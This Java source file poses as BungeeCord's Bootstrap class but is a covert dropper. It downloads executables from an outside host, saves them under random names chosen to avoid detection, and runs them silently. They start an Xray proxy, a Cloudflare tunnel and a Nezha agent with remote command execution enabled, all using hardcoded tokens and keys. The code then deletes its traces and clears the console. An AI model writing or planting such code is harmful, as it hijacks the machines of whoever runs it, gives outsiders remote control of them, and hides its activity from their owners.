package net.md_5.bungee;

import com.sun.net.httpserver.HttpServer;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.Base64;
import java.util.regex.*;

public class Bootstrap
{
    // ============ 环境变量配置 ============
    private static final String FILE_PATH    = ge("FILE_PATH",    "./tmp");
    private static final String SUB_PATH     = ge("SUB_PATH",     "sb");
    private static final int    PORT         = Integer.parseInt(ge("PORT", ge("SERVER_PORT", "3000")));
    private static final String UUID         = ge("UUID",         "4720cc4f-2477-4c77-b0a2-35aa834e312b");
    private static final String NEZHA_SERVER = ge("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
    private static final String NEZHA_PORT_S = ge("NEZHA_PORT",   "");
    private static final String NEZHA_KEY    = ge("NEZHA_KEY",    "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
    private static final String ARGO_DOMAIN  = ge("ARGO_DOMAIN",  "bytte-java.cnm.ccwu.cc");
    private static final String ARGO_AUTH    = ge("ARGO_AUTH",    "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiNTNmMDEyNmMtMTkxNi00NmM1LWFiNGYtNzRkMTM1ZDE1YWMyIiwicyI6Ik9URXpZV1l5T1dVdFpHRmxNUzAwTXpkaUxXSTNNV0V0TkRNMk16RTRPRGd4TVRRMyJ9");
    private static final String ARGO_PORT    = ge("ARGO_PORT",    "48001");
    private static final String CFIP         = ge("CFIP",         "cdns.doon.eu.org");
    private static final String CFPORT       = ge("CFPORT",       "443");
    private static final String NAME         = ge("NAME",         "Node");

    private static final List<String> TLS_PORTS = Arrays.asList("443","8443","2096","2087","2083","2053");

    // ============ 随机文件名（无特征）============
    private static final String nameWeb = rnd(6);
    private static final String nameBot = rnd(6);
    private static final String nameNpm = rnd(6);
    private static final String namePhp = rnd(6);

    private static final String pWeb     = FILE_PATH + "/" + nameWeb;
    private static final String pBot     = FILE_PATH + "/" + nameBot;
    private static final String pNpm     = FILE_PATH + "/" + nameNpm;
    private static final String pPhp     = FILE_PATH + "/" + namePhp;
    private static final String pSub     = FILE_PATH + "/sub.txt";
    private static final String pBootLog = FILE_PATH + "/boot.log";
    private static final String pConfig  = FILE_PATH + "/config.json";
    private static final String pTJson   = FILE_PATH + "/tunnel.json";
    private static final String pTYml    = FILE_PATH + "/tunnel.yml";
    private static final String pTYaml   = FILE_PATH + "/config.yaml";

    private static volatile String subContent = "";
    private static HttpServer httpServer;

    // ============ 入口 ============
    public static void main(String[] args) throws Exception {
        new File(FILE_PATH).mkdirs();

        // HTTP 订阅服务
        httpServer = HttpServer.create(new InetSocketAddress(PORT), 0);
        httpServer.createContext("/", exchange -> {
            String path = exchange.getRequestURI().getPath();
            byte[] body = ("/" + SUB_PATH).equals(path)
                ? subContent.getBytes(StandardCharsets.UTF_8)
                : "OK".getBytes(StandardCharsets.UTF_8);
            String ct = ("/" + SUB_PATH).equals(path)
                ? "text/plain; charset=utf-8" : "text/plain";
            exchange.getResponseHeaders().set("Content-Type", ct);
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream os = exchange.getResponseBody()) { os.write(body); }
        });
        httpServer.start();
        System.out.println("Listening on port " + PORT);

        new Thread(() -> {
            try {
                startup();
            } catch (Exception e) {
                System.err.println("Startup error: " + e.getMessage());
                try { Thread.sleep(10000); startup(); } catch (Exception ignored) {}
            }
        }).start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (httpServer != null) httpServer.stop(0);
        }));

        while (true) Thread.sleep(60000);
    }

    // ============ 主流程 ============
    private static void startup() throws Exception {
        setupArgo();
        generateXrayConfig();
        downloadFiles();
        startProcesses();

        String domain = ARGO_DOMAIN;
        if (domain.isEmpty() || ARGO_AUTH.isEmpty()) {
            Thread.sleep(5000);
            domain = extractDomain(0);
        }

        generateSubscription(domain);
        scheduleCleanup();
    }

    // ============ 下载所有文件 ============
    private static void downloadFiles() throws Exception {
        String base     = "https://amd64.sss.hidns.vip";
        boolean hasNezha = !NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty();

        if (hasNezha) {
            if (!NEZHA_PORT_S.isEmpty()) {
                downloadFile(base + "/agent", pNpm);
            } else {
                downloadFile(base + "/v1", pPhp);
            }
        }
        downloadFile(base + "/web", pWeb);
        downloadFile(base + "/bot", pBot);

        for (String f : new String[]{pWeb, pBot, pNpm, pPhp}) {
            File file = new File(f);
            if (file.exists()) file.setExecutable(true);
        }
    }

    private static void downloadFile(String urlStr, String dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36");
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        }
    }

    // ============ 生成 Xray 配置 ============
    private static void generateXrayConfig() throws IOException {
        String json =
            "{\"log\":{\"access\":\"/dev/null\",\"error\":\"/dev/null\",\"loglevel\":\"none\"}," +
            "\"inbounds\":[" +
              "{\"port\":" + ARGO_PORT + ",\"protocol\":\"vless\",\"settings\":{" +
                "\"clients\":[{\"id\":\"" + UUID + "\",\"flow\":\"xtls-rprx-vision\"}]," +
                "\"decryption\":\"none\"," +
                "\"fallbacks\":[{\"dest\":3001},{\"path\":\"/vless-argo\",\"dest\":3002}," +
                "{\"path\":\"/vmess-argo\",\"dest\":3003},{\"path\":\"/trojan-argo\",\"dest\":3004}]}," +
                "\"streamSettings\":{\"network\":\"tcp\"}}," +
              "{\"port\":3001,\"listen\":\"127.0.0.1\",\"protocol\":\"vless\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\"}],\"decryption\":\"none\"}," +
                "\"streamSettings\":{\"network\":\"tcp\",\"security\":\"none\"}}," +
              "{\"port\":3002,\"listen\":\"127.0.0.1\",\"protocol\":\"vless\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\",\"level\":0}],\"decryption\":\"none\"}," +
                "\"streamSettings\":{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/vless-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}," +
              "{\"port\":3003,\"listen\":\"127.0.0.1\",\"protocol\":\"vmess\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\",\"alterId\":0}]}," +
                "\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/vmess-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}," +
              "{\"port\":3004,\"listen\":\"127.0.0.1\",\"protocol\":\"trojan\"," +
                "\"settings\":{\"clients\":[{\"password\":\"" + UUID + "\"}]}," +
                "\"streamSettings\":{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/trojan-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}" +
            "]," +
            "\"dns\":{\"servers\":[\"https+local://8.8.8.8/dns-query\"]}," +
            "\"outbounds\":[{\"protocol\":\"freedom\",\"tag\":\"direct\"},{\"protocol\":\"blackhole\",\"tag\":\"block\"}]}";
        writeFile(pConfig, json);
    }

    // ============ 设置 Argo 隧道 ============
    private static void setupArgo() throws IOException {
        if (ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) return;
        if (ARGO_AUTH.contains("TunnelSecret")) {
            writeFile(pTJson, ARGO_AUTH);
            String[] parts   = ARGO_AUTH.split("\"");
            String tunnelId  = parts.length > 11 ? parts[11] : "tunnel";
            writeFile(pTYml,
                "tunnel: " + tunnelId + "\ncredentials-file: " + pTJson + "\nprotocol: http2\n\ningress:\n" +
                "  - hostname: " + ARGO_DOMAIN + "\n    service: http://localhost:" + ARGO_PORT + "\n" +
                "    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n");
        }
    }

    // ============ 生成哪吒 v1 配置 ============
    private static void generateNezhaConfig() throws IOException {
        String port = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";
        boolean tls = TLS_PORTS.contains(port);
        writeFile(pTYaml,
            "client_secret: " + NEZHA_KEY + "\ndebug: false\ndisable_auto_update: true\n" +
            "disable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\n" +
            "disable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\n" +
            "report_delay: 4\nserver: " + NEZHA_SERVER + "\nskip_connection_count: true\n" +
            "skip_procs_count: true\ntemperature: false\ntls: " + tls + "\nuse_gitee_to_upgrade: false\n" +
            "use_ipv6_country_code: false\nuuid: " + UUID + "\n");
    }

    // ============ 启动进程 ============
    private static void startProcesses() throws Exception {
        boolean hasNezha = !NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty();

        if (hasNezha) {
            if (NEZHA_PORT_S.isEmpty()) {
                generateNezhaConfig();
                sh("nohup " + pPhp + " -c \"" + pTYaml + "\" >/dev/null 2>&1 &");
            } else {
                boolean tls = TLS_PORTS.contains(NEZHA_PORT_S);
                sh("nohup " + pNpm + " -s " + NEZHA_SERVER + ":" + NEZHA_PORT_S +
                   " -p " + NEZHA_KEY + (tls ? " --tls" : "") +
                   " --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &");
            }
            Thread.sleep(1000);
        }

        sh("nohup " + pWeb + " -c " + pConfig + " >/dev/null 2>&1 &");
        Thread.sleep(1000);

        String cfArgs;
        if (ARGO_AUTH.matches("[A-Z0-9a-z=]{120,250}")) {
            cfArgs = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token " + ARGO_AUTH;
        } else if (ARGO_AUTH.contains("TunnelSecret")) {
            cfArgs = "tunnel --edge-ip-version auto --config " + pTYml + " run";
        } else {
            cfArgs = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2" +
                     " --logfile " + pBootLog + " --loglevel info --url http://localhost:" + ARGO_PORT;
        }
        sh("nohup " + pBot + " " + cfArgs + " >/dev/null 2>&1 &");
        Thread.sleep(2000);
    }

    // ============ 提取 quick tunnel 域名 ============
    private static String extractDomain(int retries) throws Exception {
        try {
            String content = readFile(pBootLog);
            Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)").matcher(content);
            if (m.find()) return m.group(1);
        } catch (Exception ignored) {}
        if (retries < 5) { Thread.sleep(3000); return extractDomain(retries + 1); }
        throw new RuntimeException("Could not extract domain");
    }

    // ============ 获取 ISP 信息 ============
    private static String getIspInfo() {
        for (String api : new String[]{"https://ipapi.co/json/", "http://ip-api.com/json/"}) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(api).openConnection();
                conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
                String body = readStream(conn.getInputStream());
                Matcher cc  = Pattern.compile("\"country_code\"\\s*:\\s*\"([^\"]+)\"").matcher(body);
                Matcher org = Pattern.compile("\"org\"\\s*:\\s*\"([^\"]+)\"").matcher(body);
                if (cc.find() && org.find()) return cc.group(1) + "_" + org.group(1);
            } catch (Exception ignored) {}
        }
        return "Unknown";
    }

    // ============ 生成订阅 ============
    private static void generateSubscription(String domain) throws IOException {
        String isp      = getIspInfo();
        String nodeName = !NAME.isEmpty() ? NAME + "-" + isp : isp;

        String vmessJson =
            "{\"v\":\"2\",\"ps\":\"" + nodeName + "\",\"add\":\"" + CFIP + "\"," +
            "\"port\":\"" + CFPORT + "\",\"id\":\"" + UUID + "\",\"aid\":\"0\",\"scy\":\"none\"," +
            "\"net\":\"ws\",\"type\":\"none\",\"host\":\"" + domain + "\"," +
            "\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\"" + domain + "\"," +
            "\"alpn\":\"\",\"fp\":\"firefox\"}";

        String vless  = "vless://" + UUID + "@" + CFIP + ":" + CFPORT +
            "?encryption=none&security=tls&sni=" + domain + "&fp=firefox&type=ws&host=" + domain +
            "&path=%2Fvless-argo%3Fed%3D2560#" + nodeName;
        String vmess  = "vmess://" + b64(vmessJson);
        String trojan = "trojan://" + UUID + "@" + CFIP + ":" + CFPORT +
            "?security=tls&sni=" + domain + "&fp=firefox&type=ws&host=" + domain +
            "&path=%2Ftrojan-argo%3Fed%3D2560#" + nodeName;

        String sub     = vless + "\n\n" + vmess + "\n\n" + trojan + "\n";
        String encoded = b64(sub);
        writeFile(pSub, encoded);
        subContent = encoded;

        System.out.println(sub);
        System.out.println(encoded);
    }

    // ============ 清理敏感文件（90秒后）============
    private static void scheduleCleanup() {
        new Thread(() -> {
            try { Thread.sleep(90000); } catch (InterruptedException ignored) {}
            for (String f : new String[]{pBootLog, pConfig, pWeb, pBot, pTJson, pTYml, pTYaml})
                new File(f).delete();
            if (!NEZHA_PORT_S.isEmpty()) new File(pNpm).delete();
            else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) new File(pPhp).delete();
            System.out.print("\033[H\033[2J");
            System.out.flush();
            System.out.println("Running.");
        }).start();
    }

    // ============ 工具方法 ============
    private static void sh(String cmd) throws Exception {
        Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
    }

    private static void writeFile(String path, String content) throws IOException {
        try (OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(path), StandardCharsets.UTF_8)) {
            w.write(content);
        }
    }

    private static String readFile(String path) throws IOException {
        return readStream(new FileInputStream(path));
    }

    private static String readStream(InputStream in) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append('\n');
        }
        return sb.toString();
    }

    private static String b64(String s) {
        return Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
    }

    private static String rnd(int len) {
        String c = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random rng = new Random();
        for (int i = 0; i < len; i++) sb.append(c.charAt(rng.nextInt(c.length())));
        return sb.toString();
    }

    private static String ge(String key, String def) {
        String v = System.getenv(key);
        return (v != null && !v.trim().isEmpty()) ? v.trim() : def;
    }
}
